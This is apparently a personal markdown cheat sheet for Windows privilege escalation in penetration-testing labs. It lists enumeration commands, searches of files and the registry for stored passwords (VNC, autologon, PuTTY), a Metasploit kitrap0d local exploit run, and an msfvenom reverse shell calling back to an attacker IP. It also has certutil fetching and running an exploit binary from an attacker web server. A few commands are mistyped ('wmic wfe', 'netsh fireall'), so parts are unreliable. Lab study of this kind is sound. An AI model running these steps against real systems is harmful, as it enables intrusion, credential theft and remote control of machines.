# Windows Privilege Escalation

Fuzzy Security Guide - https://www.fuzzysecurity.com/tutorials/16.html

PayloadsAllTheThings Guide - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Absolomb Windows Privilege Escalation Guide - https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

Sushant 747's Guide (Country dependant - may need VPN) - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

## Gaining a Foothold

msfvenom: https://netsec.ws/?p=331

## Initial Enumeration

### System Enumeration

```
systeminfo
systeminfo | findstr /B /C: "OS Name" /C:"OS Version" /C:"System Type"
```
```
hostname
```
```
wmic wfe
wmic wfe get Caption,Description,HotFixID,InstalledOn
```
```
wmic logicaldisk get caption,description,providername
```

### User Enumeration

```
whoami
whoami /priv
whoami /groups
```
```
net user
net user hunter
net user administrator
net localgroup
net localgroup administrators
```

## Network Enumeration

```
ipconfig
ipconfig /all
```
```
arp -a
arp -all
```
```
route print
```
```
netstat -ano
```

### Password Hunting

Search for them:

```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

In Files:

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

In Registry:

```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### AV Enumeration

```
query windefend
```
```
sc queryex type= service
```
```
net advfirewall firewall dump
```
```
firewall show state
```
```
netsh fireall show config
```

## Exploring Automated Tools

winpeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

Windows Priv Esc Checklist: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

Sherlock: https://github.com/rasta-mouse/Sherlock

Watson: https://github.com/rasta-mouse/Watson

PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

JAWS: https://github.com/411Hall/JAWS

Windows Exploit Suggester: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

Metasploit Local Exploit Suggester: https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/

Seatbelt: https://github.com/GhostPack/Seatbelt

SharpUp: https://github.com/GhostPack/SharpUp

---

Upload WinPEAS to Windows Machine

```
cd c:\\windows\\temp
upload /root/tranfers/winPEAS.exe
shell
```

```
winPEAS.exe
```

Run PowerShell on Windows machine

```
powershell -ep bypass
```

Load PowerShell via MetaSploit

```
load powershell
```

Meterpreter Exploit Suggester

```
run post/multi/recon/local_exploit_suggester
```

Windows Exploit Suggester Python

```
./windows-exploit-suggester.py --update
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py
pip install xlrd --upgrade
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo sysinfo.txt
```

## Escalation Path: Kernel Exploits

Windows Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits

### Escalation with Metasploit

Kitrap0d Info: https://seclists.org/fulldisclosure/2010/Jan/341

```
use exploit/windows/local/ms10_015_kitrap0d
options
set session 9
set LHOST tun0
set LPORT 5555
run
getuid
shell
```

### Manual Kernel Exploitation

MS10-059: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f -aspx > manual.aspx 
nc -nvlp 4444
```
```
ftp 10.10.10.5
put manual.aspx
```
```
python3 -m http.server 80
```
```
cd temp
certutil -urlcache -f hxxp://10.10.14.5/MS10-059.exe ms.exe
ms.exe 10.10.14.5 5555
```
